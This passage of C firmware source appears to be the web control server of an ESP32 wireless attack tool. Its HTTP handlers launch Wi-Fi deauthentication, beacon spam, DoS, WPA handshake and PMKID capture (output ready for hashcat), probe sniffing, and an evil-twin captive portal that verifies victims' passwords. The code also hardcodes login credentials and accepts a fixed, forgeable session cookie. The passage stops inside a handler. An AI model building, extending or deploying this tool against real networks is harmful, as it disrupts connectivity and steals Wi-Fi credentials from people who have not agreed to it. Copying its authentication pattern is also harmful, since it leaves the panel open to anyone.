#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <stdbool.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "esp_event.h"
#include "esp_http_server.h"
#include "cJSON.h"
#include "wifi_scanner.h"
#include "wifi_controller.h"
#include "attack_deauth.h"
#include "attack_deauth_detector.h"
#include "attack_beacon_spam.h"
#include "attack_dos.h"
#include "attack_handshake.h"
#include "attack_pmkid.h"
#include "attack_probe.h"
#include "attack_eviltwin.h"
#include "attack_bt_spam.h"
#include "bt/ble_scan.h"
#include "bt/ble_spoof.h"
#include "bt/ble_connect_flood.h"
#include "bt/ble_l2cap_flood.h"
#include "bt/ble_gatt_probe.h"
#include "bt/ble_deauth.h"
#include "attack.h"
#include "web_ui.h"
#include "ble_passkey.h"
#include "bt/ble_takeover.h"
#include "ota_attack.h"
#include "esp_system.h"     /* for esp_get_free_heap_size() */

static const char *TAG = "WEB_SERVER";
static httpd_handle_t server_handle = NULL;
static wifi_ap_record_t dos_target = {0};
static wifi_ap_record_t handshake_target = {0};
static wifi_ap_record_t pmkid_target = {0};
static wifi_ap_record_t evil_twin_target = {0};

ESP_EVENT_DEFINE_BASE(WEBSERVER_EVENTS);

/* Helper: get server handle (exposed via web.h) */
httpd_handle_t webserver_get_handle(void) {
    return server_handle;
}

#define USERNAME "omega"
#define PASSWORD "solutions123"

static int attack_duration_minutes = 0;
static time_t attack_start_time = 0;
static bool attack_timer_active = false;
static TaskHandle_t attack_timer_handle = NULL;

/* ================================================================== */
/*  Authentication helpers                                             */
/* ================================================================== */

static bool session_cookie_is_authenticated(const char *cookie) {
    if (cookie == NULL) {
        return false;
    }

    const char expected[] = "session=authenticated";
    const size_t expected_len = sizeof(expected) - 1;

    while (*cookie != '\0') {
        while (*cookie == ' ' || *cookie == ';') {
            cookie++;
        }

        const char *end = strchr(cookie, ';');
        size_t len = end ? (size_t)(end - cookie) : strlen(cookie);
        while (len > 0 && cookie[len - 1] == ' ') {
            len--;
        }

        if (len == expected_len && strncmp(cookie, expected, expected_len) == 0) {
            return true;
        }

        if (end == NULL) {
            break;
        }
        cookie = end + 1;
    }

    return false;
}

static bool request_is_authenticated(httpd_req_t *req) {
    char cookie[100] = {0};
    if (httpd_req_get_hdr_value_str(req, "Cookie", cookie, sizeof(cookie)) != ESP_OK) {
        return false;
    }

    return session_cookie_is_authenticated(cookie);
}

/* ================================================================== */
/*  Form / JSON helpers                                                */
/* ================================================================== */

static bool get_form_value(const char *content, const char *key, char *out, size_t out_size) {
    if (content == NULL || key == NULL || out == NULL || out_size == 0) {
        return false;
    }

    char marker[40];
    int marker_len = snprintf(marker, sizeof(marker), "%s=", key);
    if (marker_len <= 0 || (size_t)marker_len >= sizeof(marker)) {
        return false;
    }

    const char *value = strstr(content, marker);
    if (value == NULL) {
        return false;
    }
    value += marker_len;

    size_t len = strcspn(value, "&");
    if (len >= out_size) {
        len = out_size - 1;
    }

    memcpy(out, value, len);
    out[len] = '\0';

    char *src = out;
    char *dst = out;
    while (*src) {
        if (*src == '+') {
            *dst++ = ' ';
            src++;
            continue;
        }
        if (*src == '%' && src[1] && src[2]) {
            int hi = src[1];
            int lo = src[2];
            hi = (hi >= '0' && hi <= '9') ? (hi - '0') :
                 (hi >= 'a' && hi <= 'f') ? (hi - 'a' + 10) :
                 (hi >= 'A' && hi <= 'F') ? (hi - 'A' + 10) : -1;
            lo = (lo >= '0' && lo <= '9') ? (lo - '0') :
                 (lo >= 'a' && lo <= 'f') ? (lo - 'a' + 10) :
                 (lo >= 'A' && lo <= 'F') ? (lo - 'A' + 10) : -1;
            if (hi >= 0 && lo >= 0) {
                *dst++ = (char)((hi << 4) | lo);
                src += 3;
                continue;
            }
        }
        *dst++ = *src++;
    }
    *dst = '\0';
    while (dst > out && (dst[-1] == '\r' || dst[-1] == '\n' || dst[-1] == ' ' || dst[-1] == '\t')) {
        *--dst = '\0';
    }
    return true;
}

static bool parse_bssid(const char *value, uint8_t bssid[6]) {
    if (value == NULL || bssid == NULL) {
        return false;
    }

    unsigned int bytes[6];
    if (sscanf(value, "%2x:%2x:%2x:%2x:%2x:%2x",
               &bytes[0], &bytes[1], &bytes[2], &bytes[3], &bytes[4], &bytes[5]) != 6) {
        return false;
    }

    for (size_t i = 0; i < 6; i++) {
        if (bytes[i] > 0xff) {
            return false;
        }
        bssid[i] = (uint8_t)bytes[i];
    }

    return true;
}

static bool fill_ap_record_from_json(cJSON *root, wifi_ap_record_t *record, bool require_ssid) {
    if (root == NULL || record == NULL) {
        return false;
    }

    cJSON *bssid_json = cJSON_GetObjectItem(root, "bssid");
    cJSON *channel_json = cJSON_GetObjectItem(root, "channel");
    cJSON *ssid_json = cJSON_GetObjectItem(root, "ssid");

    if (!cJSON_IsString(bssid_json) || !cJSON_IsNumber(channel_json)) {
        return false;
    }
    if (require_ssid && !cJSON_IsString(ssid_json)) {
        return false;
    }
    if (channel_json->valueint <= 0 || channel_json->valueint > 14) {
        return false;
    }

    memset(record, 0, sizeof(*record));
    if (!parse_bssid(bssid_json->valuestring, record->bssid)) {
        return false;
    }

    record->primary = (uint8_t)channel_json->valueint;
    if (cJSON_IsString(ssid_json) && ssid_json->valuestring != NULL) {
        strncpy((char *)record->ssid, ssid_json->valuestring, sizeof(record->ssid) - 1);
        record->ssid[sizeof(record->ssid) - 1] = '\0';
    }

    return true;
}

static esp_err_t send_json_response(httpd_req_t *req, cJSON *root) {
    if (root == NULL) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "JSON allocation failed");
        return ESP_FAIL;
    }

    char *response = cJSON_PrintUnformatted(root);
    if (response == NULL) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "JSON serialization failed");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "application/json");
    esp_err_t err = httpd_resp_send(req, response, strlen(response));
    cJSON_Delete(root);
    free(response);
    return err;
}

static esp_err_t send_success_response(httpd_req_t *req) {
    cJSON *response = cJSON_CreateObject();
    if (response != NULL) {
        cJSON_AddBoolToObject(response, "success", true);
    }
    return send_json_response(req, response);
}

static wifi_ap_record_t *scan_networks(size_t *ap_count) {
    if (ap_count == NULL) {
        return NULL;
    }

    scanner_scan();
    const wifictl_ap_records_t *records = scanner_get_records();
    if (records == NULL || records->count == 0) {
        *ap_count = 0;
        return NULL;
    }

    *ap_count = records->count;
    wifi_ap_record_t *copy = malloc(sizeof(wifi_ap_record_t) * records->count);
    if (copy == NULL) {
        return NULL;
    }

    memcpy(copy, records->records, sizeof(wifi_ap_record_t) * records->count);
    return copy;
}

static bool is_attack_active(void) {
    const attack_status_t *status = attack_get_status();
    return status && status->state == RUNNING;
}

static void get_attack_target(char *target) {
    if (target == NULL) {
        return;
    }

    const attack_status_t *status = attack_get_status();
    if (status == NULL || status->content == NULL || status->content_size == 0) {
        target[0] = '\0';
        return;
    }

    size_t len = status->content_size < 127 ? status->content_size : 127;
    memcpy(target, status->content, len);
    target[len] = '\0';
}

static void attack_timer_task(void *pvParameters) {
    while (attack_timer_active) {
        vTaskDelay(pdMS_TO_TICKS(1000));
        int remaining = (attack_duration_minutes * 60) - (time(NULL) - attack_start_time);
        if (remaining <= 0 && attack_duration_minutes > 0) {
            attack_timer_active = false;
            stop_deauth_attack();
            break;
        }
    }
    attack_timer_handle = NULL;
    vTaskDelete(NULL);
}

/* ================================================================== */
/*  LOGIN HANDLERS                                                     */
/* ================================================================== */

static esp_err_t login_post_handler(httpd_req_t *req) {
    char content[256] = {0};
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    
    char username[32] = {0}, password[32] = {0};
    get_form_value(content, "username", username, sizeof(username));
    get_form_value(content, "password", password, sizeof(password));
    
    if (strcmp(username, USERNAME) == 0 && strcmp(password, PASSWORD) == 0) {
        httpd_resp_set_hdr(req, "Set-Cookie", "session=authenticated; path=/");
        httpd_resp_set_hdr(req, "Location", "/dashboard");
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_send(req, "", 0);
    } else {
        httpd_resp_set_hdr(req, "Location", "/login?error=1");
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_send(req, "", 0);
    }
    return ESP_OK;
}

static esp_err_t dashboard_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_set_hdr(req, "Location", "/login");
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_send(req, "", 0);
        return ESP_OK;
    }
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, advanced_dashboard_html, strlen(advanced_dashboard_html));
    return ESP_OK;
}

static esp_err_t login_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, advanced_login_html, strlen(advanced_login_html));
    return ESP_OK;
}

static esp_err_t logout_handler(httpd_req_t *req) {
    httpd_resp_set_hdr(req, "Set-Cookie", "session=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT");
    httpd_resp_set_hdr(req, "Location", "/login");
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_send(req, "", 0);
    return ESP_OK;
}

static esp_err_t root_handler(httpd_req_t *req) {
    httpd_resp_set_hdr(req, "Location", "/login");
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_send(req, "", 0);
    return ESP_OK;
}

/* ================================================================== */
/*  WiFi API HANDLERS                                                  */
/* ================================================================== */

static esp_err_t scan_api_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    size_t ap_count = 0;
    wifi_ap_record_t *ap_records = scan_networks(&ap_count);
    if (ap_records == NULL && ap_count > 0) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Scan failed");
        return ESP_FAIL;
    }
    cJSON *root = cJSON_CreateArray();
    if (root == NULL) {
        free(ap_records);
        return send_json_response(req, root);
    }
    for (size_t i = 0; i < ap_count; i++) {
        if (ap_records[i].ssid[0] == 0) continue;
        cJSON *network = cJSON_CreateObject();
        if (network == NULL) {
            free(ap_records);
            cJSON_Delete(root);
            return send_json_response(req, NULL);
        }
        cJSON_AddStringToObject(network, "ssid", (char*)ap_records[i].ssid);
        char bssid_str[18];
        snprintf(bssid_str, sizeof(bssid_str), MACSTR, MAC2STR(ap_records[i].bssid));
        cJSON_AddStringToObject(network, "bssid", bssid_str);
        cJSON_AddNumberToObject(network, "channel", ap_records[i].primary);
        cJSON_AddNumberToObject(network, "rssi", ap_records[i].rssi);
        const char *auth = "Open";
        if (ap_records[i].authmode == WIFI_AUTH_WEP) auth = "WEP";
        else if (ap_records[i].authmode == WIFI_AUTH_WPA_PSK) auth = "WPA";
        else if (ap_records[i].authmode == WIFI_AUTH_WPA2_PSK) auth = "WPA2";
        else if (ap_records[i].authmode == WIFI_AUTH_WPA_WPA2_PSK) auth = "WPA/WPA2";
        cJSON_AddStringToObject(network, "authmode", auth);
        cJSON_AddItemToArray(root, network);
    }
    free(ap_records);
    return send_json_response(req, root);
}

static esp_err_t mgmt_ap_get_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char ssid[33] = {0};
    char pass[64] = {0};
    if (wifictl_mgmt_ap_get_creds(ssid, sizeof(ssid), pass, sizeof(pass)) != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Failed to read AP config");
        return ESP_FAIL;
    }

    cJSON *root = cJSON_CreateObject();
    if (root != NULL) {
        cJSON_AddStringToObject(root, "ssid", ssid);
        cJSON_AddBoolToObject(root, "secured", strlen(pass) >= 8);
    }
    return send_json_response(req, root);
}

static esp_err_t mgmt_ap_set_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[256];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) {
        return ESP_FAIL;
    }
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *ssid_json = cJSON_GetObjectItem(root, "ssid");
    cJSON *pass_json = cJSON_GetObjectItem(root, "password");
    if (!cJSON_IsString(ssid_json) || !cJSON_IsString(pass_json)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing ssid/password");
        return ESP_FAIL;
    }

    esp_err_t err = wifictl_mgmt_ap_set_creds(ssid_json->valuestring, pass_json->valuestring);
    cJSON_Delete(root);
    if (err != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid SSID/password");
        return ESP_FAIL;
    }

    wifictl_mgmt_ap_stop();
    wifictl_mgmt_ap_start();
    return send_success_response(req);
}

static esp_err_t mgmt_ap_reset_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    if (wifictl_mgmt_ap_clear_creds() != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Failed to clear AP config");
        return ESP_FAIL;
    }

    wifictl_mgmt_ap_stop();
    wifictl_mgmt_ap_start();
    return send_success_response(req);
}

/* ================================================================== */
/*  WiFi ATTACK HANDLERS                                               */
/* ================================================================== */

static esp_err_t attack_api_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *bssid_json = cJSON_GetObjectItem(root, "bssid");
    cJSON *channel_json = cJSON_GetObjectItem(root, "channel");
    cJSON *minutes_json = cJSON_GetObjectItem(root, "minutes");
    
    if (!cJSON_IsString(bssid_json) || !cJSON_IsNumber(channel_json) ||
        channel_json->valueint <= 0 || channel_json->valueint > 14) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing bssid or channel");
        return ESP_FAIL;
    }
    
    uint8_t bssid[6];
    if (!parse_bssid(bssid_json->valuestring, bssid)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid bssid");
        return ESP_FAIL;
    }
    char bssid_str[18];
    snprintf(bssid_str, sizeof(bssid_str), MACSTR, MAC2STR(bssid));
    
    start_deauth_attack(bssid_str, channel_json->valueint);
    
    if (cJSON_IsNumber(minutes_json) && minutes_json->valueint > 0) {
        attack_duration_minutes = minutes_json->valueint <= 999 ? minutes_json->valueint : 999;
        attack_start_time = time(NULL);
        attack_timer_active = true;
        if (attack_timer_handle == NULL) {
            xTaskCreate(attack_timer_task, "attack_timer", 2048, NULL, 5, &attack_timer_handle);
        }
    }
    
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t beacon_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    char content[100];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    
    cJSON *mode_json = cJSON_GetObjectItem(root, "mode");
    cJSON *count_json = cJSON_GetObjectItem(root, "count");
    
    int mode = mode_json ? mode_json->valueint : 0;
    int count = count_json ? count_json->valueint : 50;
    
    attack_beacon_spam_start(count, mode);
    
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t beacon_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    attack_beacon_spam_stop();
    return send_success_response(req);
}

static esp_err_t beacon_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *status = attack_beacon_spam_get_status_json();
    if (!status) {
        cJSON *fallback = cJSON_CreateObject();
        cJSON_AddBoolToObject(fallback, "running", false);
        cJSON_AddStringToObject(fallback, "mode_str", "Idle");
        cJSON_AddStringToObject(fallback, "status", "Idle");
        cJSON_AddNumberToObject(fallback, "ap_count", 0);
        cJSON_AddNumberToObject(fallback, "packet_count", 0);
        return send_json_response(req, fallback);
    }
    return send_json_response(req, status);
}

static esp_err_t dos_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    
    cJSON *method_json = cJSON_GetObjectItem(root, "method");
    
    if (!fill_ap_record_from_json(root, &dos_target, true)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing or invalid target");
        return ESP_FAIL;
    }
    
    attack_config_t attack_config = {0};
    attack_config.target_count = 1;
    attack_config.ap_records[0] = &dos_target;
    int dos_method = cJSON_IsNumber(method_json) ? method_json->valueint : ATTACK_DOS_METHOD_BROADCAST;
    if (dos_method <= ATTACK_DOS_METHOD_NONE || dos_method >= ATTACK_DOS_METHOD_COUNT) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid method");
        return ESP_FAIL;
    }
    attack_config.method = dos_method;
    
    ESP_LOGI(TAG, "Starting DoS attack with method: %d", attack_config.method);
    attack_dos_start(&attack_config);
    
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t dos_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    ESP_LOGI(TAG, "Stopping DoS attack");
    attack_dos_stop();
    return send_success_response(req);
}

static esp_err_t dos_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *status = attack_dos_get_status_json();
    if (!status) {
        cJSON *fallback = cJSON_CreateObject();
        cJSON_AddBoolToObject(fallback, "running", false);
        cJSON_AddStringToObject(fallback, "method_str", "Idle");
        cJSON_AddStringToObject(fallback, "status", "Idle");
        cJSON_AddNumberToObject(fallback, "packet_count", 0);
        return send_json_response(req, fallback);
    }
    return send_json_response(req, status);
}

/* ── Handshake Capture Handlers ──────────────────────────────────── */

static esp_err_t handshake_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    
    cJSON *method_json = cJSON_GetObjectItem(root, "method");
    
    if (!fill_ap_record_from_json(root, &handshake_target, true)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing or invalid target");
        return ESP_FAIL;
    }
    
    attack_config_t attack_config = {0};
    attack_config.target_count = 1;
    attack_config.ap_records[0] = &handshake_target;
    int handshake_method = cJSON_IsNumber(method_json) ? method_json->valueint : ATTACK_HANDSHAKE_METHOD_BROADCAST;
    if (handshake_method < ATTACK_HANDSHAKE_METHOD_ROGUE_AP || handshake_method > ATTACK_HANDSHAKE_METHOD_PASSIVE) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid method");
        return ESP_FAIL;
    }
    attack_config.method = handshake_method;
    
    ESP_LOGI(TAG, "Starting Handshake capture with method: %d", attack_config.method);
    attack_handshake_start(&attack_config);
    
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t handshake_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    ESP_LOGI(TAG, "Stopping Handshake capture");
    attack_handshake_stop();
    return send_success_response(req);
}

static esp_err_t handshake_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *status = attack_handshake_get_status_json();
    if (!status) {
        cJSON *fallback = cJSON_CreateObject();
        cJSON_AddBoolToObject(fallback, "running", false);
        cJSON_AddNumberToObject(fallback, "eapol_count", 0);
        cJSON_AddNumberToObject(fallback, "eapol_required", 4);
        cJSON_AddStringToObject(fallback, "status", "idle");
        return send_json_response(req, fallback);
    }
    return send_json_response(req, status);
}

static esp_err_t handshake_pcap_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    size_t pcap_size = attack_handshake_get_pcap_size();
    const uint8_t *pcap_data = attack_handshake_get_pcap_data();

    if (!pcap_data || pcap_size == 0) {
        httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "No PCAP data available");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "application/octet-stream");
    httpd_resp_set_hdr(req, "Content-Disposition",
                       "attachment; filename=\"handshake.pcap\"");
    httpd_resp_send(req, (const char *)pcap_data, pcap_size);
    return ESP_OK;
}

/* ── PMKID Attack Handlers ── */

static esp_err_t pmkid_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    
    if (!fill_ap_record_from_json(root, &pmkid_target, true)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing or invalid target");
        return ESP_FAIL;
    }
    
    attack_config_t attack_config = {0};
    attack_config.target_count = 1;
    attack_config.ap_records[0] = &pmkid_target;
    
    ESP_LOGI(TAG, "Starting PMKID attack on SSID: %s", pmkid_target.ssid);
    attack_pmkid_start(&attack_config);
    
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t pmkid_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    attack_pmkid_stop();
    return send_success_response(req);
}

static esp_err_t pmkid_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    char *json = attack_pmkid_get_status_json();
    if (json) {
        httpd_resp_sendstr(req, json);
        free(json);
    } else {
        httpd_resp_sendstr(req, "{\"running\":false,\"captured\":false}");
    }
    return ESP_OK;
}

static esp_err_t pmkid_hash_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    if (!attack_pmkid_has_capture()) {
        cJSON *root = cJSON_CreateObject();
        cJSON_AddBoolToObject(root, "captured", false);
        return send_json_response(req, root);
    }
    cJSON *root = cJSON_CreateObject();
    cJSON_AddBoolToObject(root, "captured", true);
    cJSON_AddStringToObject(root, "ssid", attack_pmkid_get_ssid());
    char bssid_str[18];
    const uint8_t *b = attack_pmkid_get_bssid();
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             b[0], b[1], b[2], b[3], b[4], b[5]);
    cJSON_AddStringToObject(root, "bssid", bssid_str);
    cJSON_AddStringToObject(root, "hash", attack_pmkid_get_hash());
    cJSON_AddNumberToObject(root, "hashcat_mode", 16800);
    return send_json_response(req, root);
}

/* ── Probe Sniffer Handlers ── */

static esp_err_t probe_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    ESP_LOGI(TAG, "Starting Probe Sniffer");
    attack_probe_start(NULL);

    return send_success_response(req);
}

static esp_err_t probe_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ESP_LOGI(TAG, "Stopping Probe Sniffer");
    attack_probe_stop();
    return send_success_response(req);
}

static esp_err_t probe_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, attack_probe_get_status_json());
    return ESP_OK;
}

static esp_err_t probe_ghosts_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    probe_ghost_entry_t entries[PROBE_MAX_GHOSTS];
    int count = 0;
    attack_probe_get_ghosts(entries, PROBE_MAX_GHOSTS, &count);

    cJSON *root = cJSON_CreateObject();
    cJSON *arr = cJSON_CreateArray();
    for (int i = 0; i < count; i++) {
        cJSON *item = cJSON_CreateObject();
        cJSON_AddStringToObject(item, "ssid", entries[i].ssid);
        cJSON_AddNumberToObject(item, "rssi", entries[i].rssi);
        cJSON_AddNumberToObject(item, "probes", entries[i].probe_count);
        cJSON_AddNumberToObject(item, "channel", entries[i].channel);
        char bssid_str[18];
        snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                 entries[i].bssid[0], entries[i].bssid[1], entries[i].bssid[2],
                 entries[i].bssid[3], entries[i].bssid[4], entries[i].bssid[5]);
        cJSON_AddStringToObject(item, "bssid", bssid_str);
        cJSON_AddItemToArray(arr, item);
    }
    cJSON_AddItemToObject(root, "ghosts", arr);
    cJSON_AddNumberToObject(root, "count", count);

    char *json = cJSON_PrintUnformatted(root);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json);
    free(json);
    cJSON_Delete(root);
    return ESP_OK;
}

static esp_err_t probe_clear_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    attack_probe_clear_ghosts();
    return send_success_response(req);
}

/* ── Evil Twin Handlers ── */

static esp_err_t eviltwin_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    char content[512];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    
    if (!fill_ap_record_from_json(root, &evil_twin_target, true)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing or invalid target");
        return ESP_FAIL;
    }
    
    cJSON *portal_json   = cJSON_GetObjectItem(root, "use_captive_portal");
    cJSON *deauth_json   = cJSON_GetObjectItem(root, "use_deauth");
    cJSON *verify_json   = cJSON_GetObjectItem(root, "verify_passwords");
    cJSON *interval_json = cJSON_GetObjectItem(root, "deauth_interval_sec");
    
    eviltwin_config_t et_config = {0};
    strncpy(et_config.ssid, (char *)evil_twin_target.ssid, EVILTWIN_MAX_SSID_LEN - 1);
    et_config.channel = evil_twin_target.primary;
    memcpy(et_config.bssid, evil_twin_target.bssid, 6);
    et_config.use_captive_portal = cJSON_IsBool(portal_json) ? portal_json->valueint : true;
    et_config.use_deauth         = cJSON_IsBool(deauth_json) ? deauth_json->valueint : true;
    et_config.verify_passwords   = cJSON_IsBool(verify_json) ? verify_json->valueint : true;
    et_config.deauth_interval_sec = cJSON_IsNumber(interval_json) ? interval_json->valueint : 15;
    if (et_config.deauth_interval_sec < 5) et_config.deauth_interval_sec = 5;
    if (et_config.deauth_interval_sec > 120) et_config.deauth_interval_sec = 120;
    
    ESP_LOGI(TAG, "Starting Evil Twin attack on SSID: %s (portal=%d deauth=%d verify=%d interval=%d)",
             et_config.ssid, et_config.use_captive_portal, et_config.use_deauth,
             et_config.verify_passwords, et_config.deauth_interval_sec);
    
    attack_eviltwin_start(&et_config);
    
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t eviltwin_stop_handler(httpd_req_t *req) {
